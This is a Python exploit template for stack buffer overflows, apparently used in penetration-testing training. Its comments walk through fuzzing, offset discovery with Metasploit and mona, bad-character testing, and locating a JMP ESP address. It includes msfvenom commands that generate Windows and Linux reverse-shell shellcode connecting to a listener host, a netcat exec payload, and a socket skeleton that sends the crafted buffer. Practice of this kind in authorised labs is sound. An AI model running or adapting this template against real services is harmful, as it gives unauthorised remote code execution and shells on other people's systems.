#!/usr/bin/python
import socket, struct

RHOST = "0.0.0.0"  #Target IP
RPORT = xxx 	   #Target Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

"""
##################
# General steps
##################
 1. Fuzz: Use For Loop or Manually do it narrowing it down and confirm

 2. Offset
     Put in random characters:  msf-pattern_create -l 9999
        
    !mona findmsp   (Easier and quicker)
        OR
	msf-pattern_offset -l 9999 -q 39654138        
        
 3. Confirm the Offset Buffer size and write B's to EIP

 4. Find bad characters

	a. Run the bad char test and copy over the bin file to the Win box
	
	b. !mona compare -a esp -f C:\badchar_test.bin  (From Crashed State)_

	c. Add any found bad chars to the loop and re-do steps a and b until mona shows "unmodified"

 5. Find a usable JMP ESP location and Test
	binary in either a running or crashed state
	
	!mona jmp -r esp -cpb "\x00\x0A"  (put all bad characters here)
	
	**************************************************************************************************************
	Sometimes you might have to search for JMP ESP and the specific .dll  you can exclude bad chars in that string.
	!mona find -s "\xff\xe4" -m slmfc.dll -cpb "\x00"

 	/usr/share/framework2/msfelfscan -f ./crossfire -j esp

	objdump -d filenametolookin | grep -i jmp

	objdump -d filenametolookin | grep -i call
	***************************************************************************************************************
	
	Convert Endianness from command line.
	# python
	>>> import struct
	>>> struct.pack("<I", 0x080414C3)   Replace 0x080414C3 with JMP ESP you found.
	'\xc3\x14\x04\x08'
	
 6. Create popcalc PoC  
 
    IMPORTANT!  Generate the shellcode new for different programs.  DON'T be lazy and try to reuse already generated shellcode!!!
 
    Remember msfvenom will prepend a decoder to the encoded shell code. You have to adjust for it so it doesn't blow a hole in your ESP.

   /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
	metasm > sub esp,0x10
   "\x83\xec\x10"
    
    ###popcalc###  
	msfvenom -p windows/exec -b '\x00' -f python --var-name popcalc CMD=calc.exe EXITFUNC=thread
	
	***If calc doesn't pop up, check the task manager.  See if the servic is running***

7.  Reverse Shell (Exploit Target)

    ###SHELLCODE###
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.60 LPORT=443 -f py --var-name=shellcode EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0A\x0D" --smallest

	msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.60 LPORT=443 -f py --var-name=shellcode EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00"

	msfvenom -p linux/x86/exec CMD="nc 192.168.1.60 53" -b "\x00" -f py
##################
"""

#2 paste Random String in buf_totlen. #3 Change back to fuzzed length.
buf_totlen = 1000
#3offset_srp = 1

#5ptr_jmp_esp = 0x00000000
#6sub_esp_10 = "\x83\xec\x10"

#6popcal here 

#7shellcode here

"""
#4
###################
badchar_test = ""
badchars = [0x00]	# Add known bad characters here (e.g. [0x00,0x0A])
## generate the string
for i in range(0x00, 0xFF+1):
	if i not in badchars:
		badchar_test += chr(i)
## open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)
####################
"""
buf = ""
buf += "A" * buf_totlen  #2 Remove the "A" * after Step 1 keep buf_totlen. Comment out after Step 2
#3buf += "A" * (offset_srp - len(buf))
#3buf += "BBBB" #5 Remove or Comment
#4buf += badchar_test  #5 Remove or Comment
#5buf += struct.pack("<I", ptr_jmp_esp)
#6buf += sub_esp_10
#5buf += "\xCC\xCC\xCC\xCC"  #6 Remove or Comment
#6buf += popcalc		####UNCOMMENT####  Remove or Comment Prior to Step 7
#7buf += shellcode
#3buf += "C" * (buf_totlen - len(buf))
buf += "\n"

s.send(buf)
s.recv(1024)
s.close()
